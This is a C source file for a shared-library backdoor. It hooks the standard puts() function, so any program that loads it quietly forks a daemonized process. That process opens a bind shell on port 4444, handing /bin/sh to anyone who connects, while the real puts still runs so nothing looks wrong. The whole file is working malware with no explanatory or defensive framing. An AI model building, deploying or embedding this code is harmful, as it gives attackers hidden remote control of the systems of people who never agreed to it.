#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>

void backdoor() {
    int server_fd, client_fd;
    struct sockaddr_in server_addr;
    char *const shell_argv[] = {"/bin/sh", NULL};
    char *const shell_envp[] = {NULL};

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) exit(0);

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(4444);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) exit(0);
    if (listen(server_fd, 1) < 0) exit(0);

    client_fd = accept(server_fd, NULL, NULL);
    if (client_fd < 0) exit(0);

    dup2(client_fd, 0);
    dup2(client_fd, 1);
    dup2(client_fd, 2);

    execve("/bin/sh", shell_argv, shell_envp);
    exit(0);
}

int puts(const char *str) {
    static int initialized = 0;

    if (!initialized) {
        initialized = 1;
        pid_t pid = fork();

        if (pid == 0) {
            setsid();
            umask(0);
            close(0); close(1); close(2);

            backdoor();
            exit(0);
        }
    }

    int (*orig_puts)(const char *str);
    orig_puts = dlsym(RTLD_NEXT, "puts");
    return orig_puts(str);
}
